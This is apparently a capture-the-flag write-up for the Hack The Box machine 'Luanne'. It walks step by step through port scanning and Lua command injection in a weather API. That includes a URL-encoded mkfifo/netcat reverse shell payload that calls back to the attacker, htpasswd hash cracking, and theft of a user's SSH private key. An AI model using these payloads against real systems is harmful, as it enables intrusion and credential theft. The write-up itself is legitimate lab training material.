@@ -1,0 +1,297 @@
+<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Hackthebox - Luanne" /><meta property="og:locale" content="en" /><meta name="description" content="Just another hackthebox writeups website powered by poorduck" /><meta property="og:description" content="Just another hackthebox writeups website powered by poorduck" /><link rel="canonical" href="https://x00tex.github.io/posts/luanne/" /><meta property="og:url" content="https://x00tex.github.io/posts/luanne/" /><meta property="og:site_name" content="Poorduck" /><meta property="og:image" content="https://x00tex.github.io/assets/img/posts/luanne/luanne_banner.png" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-11-28T18:30:00+00:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://x00tex.github.io/assets/img/posts/luanne/luanne_banner.png" /><meta property="twitter:title" content="Hackthebox - Luanne" /><meta name="twitter:site" content="@p00rduck" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-05-16T12:46:34+00:00","datePublished":"2020-11-28T18:30:00+00:00","description":"Just another hackthebox writeups website powered by poorduck","headline":"Hackthebox - Luanne","image":"https://x00tex.github.io/assets/img/posts/luanne/luanne_banner.png","mainEntityOfPage":{"@type":"WebPage","@id":"https://x00tex.github.io/posts/luanne/"},"url":"https://x00tex.github.io/posts/luanne/"}</script><title>Hackthebox - Luanne | Poorduck</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Poorduck"><meta name="application-name" content="Poorduck"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" /assets/img/poorduck.png " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Poorduck</a></div><div class="site-subtitle font-italic">Kwak kwak</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/x00tex" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/p00rduck" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['x00tex-writeups.3us6n','simplelogin.co'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Hackthebox - Luanne</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hackthebox - Luanne</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/p00rduck">p00rduck</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1606588200" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2020-11-28 </em> </span> <span> Updated <em class="timeago" data-ts="1652705194" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-05-16 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1505 words"> <em>8 min</em> read</span></div></div></div><div class="post-content"><p><img data-src="/assets/img/posts/luanne/luanne_banner.png" alt="" data-proofer-ignore></p><p align="right"> <a href="https://www.hackthebox.eu/home/users/profile/391067" target="_blank"><img loading="lazy" alt="x00tex" data-src="https://www.hackthebox.eu/badge/image/391067" data-proofer-ignore></a></p><h1 id="scanning">Scanning</h1><h2 id="nmap"><span class="mr-2">Nmap</span><a href="#nmap" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p><code class="language-plaintext highlighter-rouge">ports=$(nmap -Pn -p- --min-rate=1000 -T4 10.10.10.218 | grep open | awk -F / '{print $1}' ORS=',') echo $ports &amp;&amp; nmap -p$ports -sV -sC -v -T4 -oA scans/nmap.full 10.10.10.218</code></p><div class="language-diff highlighter-rouge"><div class="code-header"> <span data-label-text="Diff"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+</pre><td class="rouge-code"><pre><span class="p">PORT     STATE SERVICE REASON         VERSION
+</span><span class="gi">+ 22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.0 (NetBSD 20190418-hpn13v14-lpk; protocol 2.0)
++ 80/tcp   open  http    syn-ack ttl 63 nginx 1.19.0
+</span><span class="err">|</span> http-auth: 
+<span class="err">|</span> HTTP/1.1 401 Unauthorized\x0D
+<span class="err">|_</span>  Basic realm=.
+<span class="err">|</span> http-methods: 
+<span class="err">|_</span>  Supported Methods: GET HEAD POST
+<span class="err">|</span> http-robots.txt: 1 disallowed entry 
+<span class="err">|_/weather</span>
+|_http-server-header: nginx/1.19.0
+<span class="err">|_http-title:</span> 401 Unauthorized
+<span class="gi">+ 9001/tcp open  http    syn-ack ttl 63 Medusa httpd 1.12 (Supervisor process manager)
+</span><span class="err">|</span> http-auth: 
+<span class="err">|</span> HTTP/1.1 401 Unauthorized\x0D
+<span class="err">|_</span>  Basic realm=default
+<span class="err">|_http-server-header:</span> Medusa/1.12
+<span class="err">|_http-title:</span> Error response
+<span class="p">Service Info: OS: NetBSD; CPE: cpe:/o:netbsd:netbsd
+</span></pre></table></code></div></div><ul><li>From port 80 nmap found a robots.txt file and inside that file there is a disallowed directory path <code class="language-plaintext highlighter-rouge">/weather</code><li>Port 80 <code class="language-plaintext highlighter-rouge">http://10.10.10.218</code> through a login prompt<li>Port 9001 <code class="language-plaintext highlighter-rouge">http://10.10.10.218</code> through a login prompt</ul><h2 id="web_server---port-80"><span class="mr-2">Web_server - Port 80</span><a href="#web_server---port-80" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><ul><li><p><strong>gobuster</strong> inside <code class="language-plaintext highlighter-rouge">/weather</code> directory -</p><p><code class="language-plaintext highlighter-rouge">gobuster dir -u http://10.10.10.218/weather/ -w ~/git-tools/SecLists/Discovery/Web-Content/raft-medium-directories.txt -t 40</code></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>/forecast (Status: 200)
+</pre></table></code></div></div><li><p><strong>Goto</strong> <code class="language-plaintext highlighter-rouge">http://10.10.10.218/weather/forecast</code> through an error -</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>{"code": 200, "message": "No city specified. Use 'city=list' to list available cities."}
+</pre></table></code></div></div><li><p>specifying <code class="language-plaintext highlighter-rouge">city=list</code> in the url and <strong>Goto</strong> <code class="language-plaintext highlighter-rouge">http://10.10.10.218/weather/forecast?city=list</code> give the list of cities -</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>{"code": 200,"cities": ["London","Manchester","Birmingham","Leeds","Glasgow","Southampton","Liverpool","Newcastle","Nottingham","Sheffield","Bristol","Belfast","Leicester"]}
+</pre></table></code></div></div><li><p>specifying the city name from the list <code class="language-plaintext highlighter-rouge">city=London</code> in the url <code class="language-plaintext highlighter-rouge">http://10.10.10.218/weather/forecast?city=London</code> give the weather report of the city and the report is same for every city.</p><li><p>adding single quote <code class="language-plaintext highlighter-rouge">'</code> in the end <code class="language-plaintext highlighter-rouge">http://10.10.10.218/weather/forecast?city='</code> through an error</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>&lt;br&gt;Lua error: /usr/local/webapi/weather.lua:49: attempt to call a nil value
+</pre></table></code></div></div><li>Error specified that the backend is running <code class="language-plaintext highlighter-rouge">lua</code> language.<li>try different lua syntax and finely execute lua syntax -</ul><p><strong>Request:</strong> <code class="language-plaintext highlighter-rouge">http://10.10.10.218/weather/forecast?city=%27%29%3Bprint%28%22pwn%22%29--</code></p><p><strong>Response:</strong> <code class="language-plaintext highlighter-rouge">{"code": 500,"error": "unknown city: pwn</code></p><ul><li>breakdown the payload -<ol><li>payload is url encoded formate<li>original lua syntax to fil the nill value <code class="language-plaintext highlighter-rouge">');&lt;lua_syntax&gt;--</code></ol><li>there is a <code class="language-plaintext highlighter-rouge">os.execute</code> function in the lua that execute shell command from lua syntax.<li><p>create a code execution payload with lua runtime -</p><p><strong>Payload:</strong> <code class="language-plaintext highlighter-rouge">');os.execute("id")--</code></p><p><strong><a href="https://www.url-encode-decode.com/">URL-Enode</a>:</strong> <code class="language-plaintext highlighter-rouge">%27%29%3Bos.execute%28%22id%22%29--</code></p><p><strong>Request:</strong> <code class="language-plaintext highlighter-rouge">http://10.10.10.218/weather/forecast?city=%27%29%3Bos.execute%28%22id%22%29--</code></p><p><strong>Response:</strong> <code class="language-plaintext highlighter-rouge">"code": 500,"error": "unknown city: uid=24(_httpd) gid=24(_httpd) groups=24(_httpd)</code></p><li>and this verified the command execution vulnerability.</ul><h1 id="user-exploit">User Exploit</h1><h2 id="user_httpd-shell"><span class="mr-2">USER:_httpd shell</span><a href="#user_httpd-shell" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p><strong>Reverse shell: Payload:</strong> <code class="language-plaintext highlighter-rouge">');os.execute("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc tun0 4141 &gt;/tmp/f")--</code></p><p><strong><a href="https://www.url-encode-decode.com/">URL-Enode</a>:</strong> <code class="language-plaintext highlighter-rouge">%27%29%3Bos.execute%28%22rm%2520+%2Ftmp%2Ff%3Bmkfifo+%2Ftmp%2Ff%3Bcat+%2Ftmp%2Ff%7C%2Fbin%2Fsh+-i+2%3E%261%7Cnc+tun0+4141+%3E%2Ftmp%2Ff%22%29--</code></p><p><strong>Request:</strong> <code class="language-plaintext highlighter-rouge">http://10.10.10.218/weather/forecast?city=%27%29%3Bos.execute%28%22rm%20%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20tun0%204141%20%3E%2Ftmp%2Ff%22%29--</code></p><p><strong>Response:</strong> <code class="language-plaintext highlighter-rouge">nc -nvlp 4141</code></p><div class="language-diff highlighter-rouge"><div class="code-header"> <span data-label-text="Diff"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre> listening on [any] 4141 ...
+<span class="gi">+connect to [10.10.14.47] from (UNKNOWN) [10.10.10.218] 65376
+</span> sh: can't access tty; job control turned off
+
++$ id
+<span class="gi">+uid=24(_httpd) gid=24(_httpd) groups=24(_httpd)
+</span></pre></table></code></div></div><h2 id="user-escalation"><span class="mr-2">User Escalation</span><a href="#user-escalation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><ul><li>inside the <code class="language-plaintext highlighter-rouge">/var/www</code> dir there is a <code class="language-plaintext highlighter-rouge">.htpasswd</code> file which contains a user and password hash -<div class="language-diff highlighter-rouge"><div class="code-header"> <span data-label-text="Diff"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre><td class="rouge-code"><pre><span class="err">$</span> cd /var/www
+<span class="err">$</span> ls -la
+<span class="gi">+-rw-r--r--   1 root  wheel   47 Sep 16 15:07 .htpasswd
+</span> -rw-r--r--   1 root  wheel  386 Sep 17 20:56 index.html
+ -rw-r--r--   1 root  wheel   78 Nov 25 11:38 robots.txt
+<span class="err">$</span> cat .htpasswd
+<span class="gi">+webapi_user:$1$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0
+</span></pre></table></code></div></div></ul><p><strong>Hash:</strong> <code class="language-plaintext highlighter-rouge">webapi_user:$1$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0</code></p><h3 id="john"><span class="mr-2">john</span><a href="#john" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-diff highlighter-rouge"><div class="code-header"> <span data-label-text="Diff"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre><td class="rouge-code"><pre><span class="err">❯</span> echo 'webapi_user:$1$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0' &gt; hash
+<span class="err">❯</span> john hash -w=/usr/share/wordlists/rockyou.txt
+<span class="p">Using default input encoding: UTF-8
+Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
+Will run 8 OpenMP threads
+</span>
++iamthebest       (webapi_user)
+
+Session completed
+</pre></table></code></div></div><h3 id="creds"><span class="mr-2">creds</span><a href="#creds" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p><code class="language-plaintext highlighter-rouge">webapi_user:iamthebest</code></p><h2 id="enumeration"><span class="mr-2">Enumeration</span><a href="#enumeration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><ul><li>login to port 80 worked but nothing interesting there,<li>and login to port 9001 not working.<li><p>home directory have a <code class="language-plaintext highlighter-rouge">r.michaels</code> user directory and r.michaels is a user -</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>r.michaels:*:1000:100::/home/r.michaels:/bin/ksh
+</pre></table></code></div></div><li><p>su to user <code class="language-plaintext highlighter-rouge">r.michaels</code> is not working</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre>$ su - r.michaels
+Inappropriate ioctl for device
+su: Sorry: Conversation failure
+</pre></table></code></div></div><li><p>and <a href="https://www.freebsd.org/cgi/man.cgi?query=doas&amp;sektion=1&amp;manpath=freebsd-release-ports">doas</a> utility is also not available for <code class="language-plaintext highlighter-rouge">_httpd</code> user -</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>$ doas -u r.michaels /bin/ksh
+doas: Operation not permitted
+</pre></table></code></div></div><li><p>checking network ports</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre>$ netstat -ant | grep LISTEN
+tcp        0      0  127.0.0.1.3000         *.*                    LISTEN
+tcp        0      0  127.0.0.1.3001         *.*                    LISTEN
+</pre></table></code></div></div><ul><li>I already seen the port 3000 in port 80 login error and 3000 is the local instance of the port 80.<li>port 3001 is new</ul><li><p>curl on port 3001</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre><td class="rouge-code"><pre>$ curl 127.0.0.1:3001
+% Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                Dload  Upload   Total   Spent    Left  Speed
+100   199  100   199    0     0  99500      0 --:--:-- --:--:-- --:--:-- 99500
+&lt;html&gt;&lt;head&gt;&lt;title&gt;401 Unauthorized&lt;/title&gt;&lt;/head&gt;
+&lt;body&gt;&lt;h1&gt;401 Unauthorized&lt;/h1&gt;
+/: &lt;pre&gt;No authorization&lt;/pre&gt;
+&lt;hr&gt;&lt;address&gt;&lt;a href="//127.0.0.1:3001/"&gt;127.0.0.1:3001&lt;/a&gt;&lt;/address&gt;
+&lt;/body&gt;&lt;/html&gt;
+</pre></table></code></div></div><li>asking for authorization.<li><p>using same creds to login -</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+</pre><td class="rouge-code"><pre>$ curl --user webapi_user:iamthebest http://127.0.0.1:3001
+% Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                Dload  Upload   Total   Spent    Left  Speed
+100   386  100   386    0     0   125k      0 --:--:-- --:--:-- --:--:--  125k
+&lt;!doctype html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;Index&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;p&gt;&lt;h3&gt;Weather Forecast API&lt;/h3&gt;&lt;/p&gt;
+    &lt;p&gt;&lt;h4&gt;List available cities:&lt;/h4&gt;&lt;/p&gt;
+    &lt;a href="/weather/forecast?city=list"&gt;/weather/forecast?city=list&lt;/a&gt;
+    &lt;p&gt;&lt;h4&gt;Five day forecast (London)&lt;/h4&gt;&lt;/p&gt;
+    &lt;a href="/weather/forecast?city=London"&gt;/weather/forecast?city=London&lt;/a&gt;
+    &lt;hr&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</pre></table></code></div></div><li>same page that get from the port 80 login.<li><p>tested the code execution vulnerability here on port 3001 and it looks line local server is not vulnerable for command execution -</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre><td class="rouge-code"><pre>$ curl --user webapi_user:iamthebest "http://127.0.0.1:3001/weather/forecast?city=%27%29%3Bos.execute%28%22id%22%29--"
+% Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                               Dload  Upload   Total   Spent    Left  Speed
+100    60    0    60    0     0  30000      0 --:--:-- --:--:-- --:--:-- 30000
+{"code": 500,"error": "unknown city: ');os.execute("id")--"}
+</pre></table></code></div></div><li><p>Running server is nginx and like apache2 <a href="https://httpd.apache.org/docs/2.4/mod/mod_userdir.html">mod_userdir</a> nginx also have this option. this allow user to create a shared dir in the <code class="language-plaintext highlighter-rouge">home/&lt;user&gt;</code> folder can be accessible form server with using <code class="language-plaintext highlighter-rouge">~</code> in prefix.</p><li><p>and the server on port 3001 is run by the user r.michaels</p><p><code class="language-plaintext highlighter-rouge">ps -aux | grep 185</code></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>r.michaels  185  0.0  0.0  34996  2004 ?     Is    6:18AM 0:00.00 /usr/libexec/httpd -u -X -s -i 127.0.0.1 -I 3001 -L weather /home/r.michaels/devel/webapi/weather.lua -P /var/run/httpd_devel.pid -U r.michaels -b /home/r.michaels/devel/www 
+</pre></table></code></div></div><li>and when testing for shared folder i found the user r.michaels ssh key’s copy in the shared folder -<div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="nv">$ </span>curl <span class="nt">--user</span> webapi_user:iamthebest <span class="s2">"http://127.0.0.1:3001/~r.michaels/"</span>
+</pre></table></code></div></div></ul><p><img data-src="/assets/img/posts/luanne/html-rspn.png" alt="" data-proofer-ignore></p><h2 id="userrmichaels-shell"><span class="mr-2">USER:r.michaels shell</span><a href="#userrmichaels-shell" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p><code class="language-plaintext highlighter-rouge">curl --user webapi_user:iamthebest http://127.0.0.1:3001/~r.michaels/id_rsa</code></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre><td class="rouge-code"><pre>  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  2610  100  2610    0     0   849k      0 --:--:-- --:--:-- --:--:-- 1274k
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
+...
+45bBkP5xOhrjMAAAAVci5taWNoYWVsc0BsdWFubmUuaHRiAQIDBAUG
+-----END OPENSSH PRIVATE KEY-----
+</pre></table></code></div></div><h3 id="ssh"><span class="mr-2">ssh</span><a href="#ssh" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p><code class="language-plaintext highlighter-rouge">ssh -i michaels-id_rsa r.michaels@10.10.10.218</code></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre><td class="rouge-code"><pre>NetBSD 9.0 (GENERIC) #0: Fri Feb 14 00:06:28 UTC 2020
+
+Welcome to NetBSD!
+
+luanne$ id
+uid=1000(r.michaels) gid=100(users) groups=100(users)
+luanne$ cat user.txt
